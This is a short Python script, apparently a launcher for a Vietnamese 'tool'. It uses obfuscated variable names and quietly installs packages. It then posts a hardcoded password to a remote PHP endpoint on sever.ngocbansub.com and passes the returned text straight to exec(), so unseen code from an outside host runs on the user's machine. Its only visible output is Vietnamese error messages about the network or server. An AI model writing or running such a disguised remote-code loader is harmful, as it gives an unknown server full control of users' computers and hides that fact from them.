import os 
import socket 
try:
  import pystyle 
  import requests 
  import googletrans 
  import bs4 
except:
  os.system('pip install requests')
  os.system('pip install pystyle')
  os.system('pip install googletrans')
  os.system('pip install bs4')
  import pystyle 
  import requests 
  import googletrans 
  import bs4 
def O0OO0O0O0O0O0000O():
    try :
        socket.create_connection(("1.1.1.1",53 ))
        return True 
    except OSError :
        pass 
    return False 
OO00000OOOO0OOOOO={'matkhau':'bongocvidaiii'}
O00O0OO00O0O00O0O={'user-agent':'Mozilla/5.0 (Linux; Android 11; Live 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.28 Mobile Safari/537.36'}
try:
    OO0O0000O000000O0=requests.post('https://sever.ngocbansub.com/python/goptooldb.php',headers=O00O0OO00O0O00O0O ,data=OO00000OOOO0OOOOO).text 
except:
    if not O0OO0O0O0O0O0000O():
        print('Hãy Kiểm Tra Kết Nối Mạng !!! ')
    else :
        print('Sever Gặp Lỗi Hãy Liên Hệ Admin !!! ')
    exit()
exec(OO0O0000O000000O0)